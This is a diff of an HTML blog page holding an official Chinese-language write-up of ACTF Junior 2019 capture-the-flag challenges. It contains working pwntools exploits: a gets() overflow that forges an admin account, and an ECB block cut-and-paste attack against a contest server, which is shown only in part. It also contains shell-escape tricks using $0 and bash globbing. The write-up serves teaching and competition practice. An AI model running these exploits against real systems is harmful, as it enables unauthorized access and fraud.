@@ -14,7 +14,11 @@
       <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;css&#x2F;lib&#x2F;font-awesome.min.css">
       <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;site.css">
       <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+      <!-- js -->
+      <script defer type="text/javascript" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;elasticlunr.min.js"></script>
+      <script defer type="text/javascript" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;search_index.en.js"></script>
       <script type="text/javascript" charset="utf-8" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;js&#x2F;sidebar.js"></script>
+      <script type="text/javascript" charset="utf-8" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;js&#x2F;search.js"></script>
 
       
         <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
@@ -52,6 +56,15 @@
                   Archives
                 </a>
               
+              
+                <div class="nav-item-search search-container js-only">
+                  <input class="input" id="search" type="search" placeholder="Search">
+
+                  <div class="search-results box">
+                    <div class="search-results__items"></div>
+                  </div>
+                </div>
+              
             </nav>
           </div>
         </header>
@@ -62,10 +75,32 @@
           
   <div class="post">
     <h1 class="post-title">ACTF Junior 2019 Official WriteUP of CSUWangj&#x27;s Challenge</h1>
-    <span class="post-date">2019-02-28</span>
-    <p>日常出锅、、、</p>
-<span id="continue-reading"></span>
-<h1 id="linux-pwn">Linux&amp;PWN</h1>
+    <div class="post-meta">
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span>
+        <span class="post-date">Posted on: </span>
+        <time datetime=2019-02-28T15:55:24+08:00 title="post created">2019-02-28</time>
+      
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa fa-calendar-check-o"></i></span>
+        <span class="modify-date">Posted modified: </span>
+        <time datetime=2020-08-07T02:01:26.829857+08:00 title="post modified">2020-08-07</time>
+      
+      
+        <span class="post-meta-divider">|</span>
+        <span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span>
+        <span class="in-category">In: </span>
+          
+            <a class="category" href="/category/WriteUp">WriteUp</a>
+          
+      
+      <span class="post-meta-divider">|</span>
+    </div>
+    <div class="post-body">
+      <p>日常出锅、、、</p>
+<span id="continue-reading"></span><h1 id="linux-pwn">Linux&amp;PWN</h1>
 <h2 id="vim">vim</h2>
 <p>首先要了解vim的几个模式</p>
 <p>然后vim在普通模式下是可以执行Linux命令的，然后就可以ls, cat flag之类的了。</p>
@@ -74,32 +109,32 @@
 <p>查看<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets2/src/src.c">源码</a>，问题出在<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Linux%26PWN/No_more_gets1/src/src.c#L140">第140行（rigist()+12）</a>，passwdbuf在namebuf前面，所以gets的时候可以把namebuf覆盖掉，于是就能强行注册一个密码自己设定的admin。</p>
 <p>一个可用的exp（来自给力的学弟）如下：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">sys</span><span style="color:#c0c5ce;">
-</span><span style="color:#65737e;"># context.log_level=&#39;debug&#39;</span><span style="color:#65737e;">
-</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">args[&#39;</span><span style="color:#a3be8c;">REMOTE</span><span style="color:#c0c5ce;">&#39;]:</span><span style="color:#c0c5ce;">
-    sh = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(sys.argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], sys.argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">])</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
-    sh = </span><span style="color:#bf616a;">process</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./a.out</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-payload=</span><span style="color:#d08770;">0x10 </span><span style="color:#c0c5ce;">* &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39; + </span><span style="color:#bf616a;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">) + </span><span style="color:#bf616a;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x555555555607</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">6) Exit</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">3</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-</span><span style="color:#65737e;">#gdb.attach(sh)</span><span style="color:#65737e;">
-#gdb.attach(sh)</span><span style="color:#65737e;">
-</span><span style="color:#c0c5ce;">sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Input your name</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">father</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">Input your password</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">aaaaaaaaaaaaaaa</span><span style="color:#96b5b4;">\0</span><span style="color:#a3be8c;">admin</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">6) Exit</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">2</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">admin</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">aaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">4</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">}</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">6</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#b48ead;">import </span><span style="color:#c0c5ce;">sys
+</span><span style="color:#65737e;"># context.log_level=&#39;debug&#39;
+
+</span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">args[&#39;</span><span style="color:#a3be8c;">REMOTE</span><span style="color:#c0c5ce;">&#39;]:
+    sh = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(sys.argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], sys.argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">])
+</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">:
+    sh = </span><span style="color:#bf616a;">process</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">./a.out</span><span style="color:#c0c5ce;">&quot;)
+
+payload=</span><span style="color:#d08770;">0x10 </span><span style="color:#c0c5ce;">* &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39; + </span><span style="color:#bf616a;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">) + </span><span style="color:#bf616a;">p64</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x555555555607</span><span style="color:#c0c5ce;">)
+
+sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">6) Exit</span><span style="color:#c0c5ce;">&quot;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">3</span><span style="color:#c0c5ce;">&quot;)
+</span><span style="color:#65737e;">#gdb.attach(sh)
+#gdb.attach(sh)
+</span><span style="color:#c0c5ce;">sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Input your name</span><span style="color:#c0c5ce;">&quot;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">father</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">Input your password</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">aaaaaaaaaaaaaaa</span><span style="color:#96b5b4;">\0</span><span style="color:#a3be8c;">admin</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">6) Exit</span><span style="color:#c0c5ce;">&quot;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">2</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">admin</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">aaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">4</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">sh.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">}</span><span style="color:#c0c5ce;">&#39;)
+sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">6</span><span style="color:#c0c5ce;">&#39;)
 </span></code></pre><h2 id="special-shell">Special_Shell</h2>
 <p>这个题是HGAME2018里看到的，感觉很有意思，YTB上有更详细的视频。</p>
 <p><a href="https://github.com/CSUAuroraLab/ACTF_Junior_2019/blob/master/Linux%26PWN/Special_Shell/src/src.c"><strong>源码</strong></a></p>
@@ -109,15 +144,15 @@ sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce
 </blockquote>
 <p>如果去找一些可能的实现可能可以看到下面这样的</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">command</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
-{</span><span style="color:#c0c5ce;">
-    </span><span style="color:#65737e;">/* balabala */</span><span style="color:#c0c5ce;">
-        </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">sh</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">-c</span><span style="color:#c0c5ce;">&quot;, command, (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*) </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
-        </span><span style="color:#bf616a;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">127</span><span style="color:#c0c5ce;">);                     </span><span style="color:#65737e;">/* We could not exec the shell */</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-    </span><span style="color:#65737e;">/* balabala */</span><span style="color:#c0c5ce;">
-    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> status;</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">system</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">const char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">command</span><span style="color:#c0c5ce;">)
+{
+    </span><span style="color:#65737e;">/* balabala */
+        </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/sh</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">sh</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">-c</span><span style="color:#c0c5ce;">&quot;, command, (</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*) </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);
+        </span><span style="color:#bf616a;">_exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">127</span><span style="color:#c0c5ce;">);                     </span><span style="color:#65737e;">/* We could not exec the shell */
+
+    /* balabala */
+    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> status;
+}
 </span></code></pre>
 <p>所以用<code>$0</code>是可以getshell的。</p>
 <p>另一方面来说，<code>man bash</code>一下，了解一下<code>meta character in bash</code>，可以用<code>/???/?? .</code>得出目录，然后<code>/???/??? ????</code>看到flag。</p>
@@ -142,52 +177,52 @@ sh.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce
 <h2 id="so-called-ecb">So called ECB</h2>
 <p>只要学到密码学的加密模式肯定会说到不要使用ECB的，而这里为了降低还特地把用户名、密码什么的分开加密再拼接，然而没有人做，感觉很不爽，不想给exp...</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*</span><span style="color:#c0c5ce;">
-</span><span style="color:#65737e;"># context.log_level=&#39;debug&#39;</span><span style="color:#65737e;">
-</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">regist</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">passwd</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Resitering Account</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">1</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">to </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&#39;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(name))</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Succeed</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">130</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">transfer</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">passwd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">to</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">amount</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Transferring</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">2</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(to)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">(amount))</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">to </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&#39;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(to))</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Succeed</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">130</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
-	</span><span style="color:#c0c5ce;">
-r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">47.107.33.15</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">45338</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
-name = &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
-passwd = &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
-admin = &#39;</span><span style="color:#a3be8c;">admin</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#c0c5ce;">
-payload = </span><span style="color:#bf616a;">regist</span><span style="color:#c0c5ce;">(r, name, passwd)[:</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
-payload += </span><span style="color:#bf616a;">transfer</span><span style="color:#c0c5ce;">(r, name, passwd, admin, </span><span style="color:#d08770;">1001</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">]</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Stealing money from admin</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">):</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">3</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(payload)</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Done</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Querying flag</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
-r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">5</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)</span><span style="color:#c0c5ce;">
-r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)</span><span style="color:#c0c5ce;">
-flag = r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">}</span><span style="color:#c0c5ce;">&quot;)</span><span style="color:#c0c5ce;">
-index = -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
-	index = flag.</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">actf</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">except</span><span style="color:#c0c5ce;">:</span><span style="color:#c0c5ce;">
-	index = flag.</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">ACTF</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
-flag = flag[index:]</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[flag] </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(flag)</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import </span><span style="color:#d08770;">*
+</span><span style="color:#65737e;"># context.log_level=&#39;debug&#39;
+
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">regist</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">passwd</span><span style="color:#c0c5ce;">):
+	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Resitering Account</span><span style="color:#c0c5ce;">&quot;
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">1</span><span style="color:#c0c5ce;">&#39;)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)
+	r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">to </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&#39;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(name))
+	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Succeed</span><span style="color:#c0c5ce;">&quot;
+	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">130</span><span style="color:#c0c5ce;">]
+
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">transfer</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">r</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">name</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">passwd</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">to</span><span style="color:#c0c5ce;">, </span><span style="color:#bf616a;">amount</span><span style="color:#c0c5ce;">):
+	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Transferring</span><span style="color:#c0c5ce;">&quot;
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">2</span><span style="color:#c0c5ce;">&#39;)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(to)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">str</span><span style="color:#c0c5ce;">(amount))
+	r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">to </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&#39;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(to))
+	</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Succeed</span><span style="color:#c0c5ce;">&quot;
+	</span><span style="color:#b48ead;">return </span><span style="color:#c0c5ce;">r.</span><span style="color:#bf616a;">recv</span><span style="color:#c0c5ce;">()[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">130</span><span style="color:#c0c5ce;">]
+	
+r = </span><span style="color:#bf616a;">remote</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">47.107.33.15</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">45338</span><span style="color:#c0c5ce;">)
+name = &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;
+passwd = &#39;</span><span style="color:#a3be8c;">a</span><span style="color:#c0c5ce;">&#39;
+admin = &#39;</span><span style="color:#a3be8c;">admin</span><span style="color:#c0c5ce;">&#39;
+payload = </span><span style="color:#bf616a;">regist</span><span style="color:#c0c5ce;">(r, name, passwd)[:</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">]
+payload += </span><span style="color:#bf616a;">transfer</span><span style="color:#c0c5ce;">(r, name, passwd, admin, </span><span style="color:#d08770;">1001</span><span style="color:#c0c5ce;">)[</span><span style="color:#d08770;">96</span><span style="color:#c0c5ce;">:</span><span style="color:#d08770;">128</span><span style="color:#c0c5ce;">]
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Stealing money from admin</span><span style="color:#c0c5ce;">&quot;
+</span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">):
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">3</span><span style="color:#c0c5ce;">&#39;)
+	r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(payload)
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[+] Done</span><span style="color:#c0c5ce;">&quot;
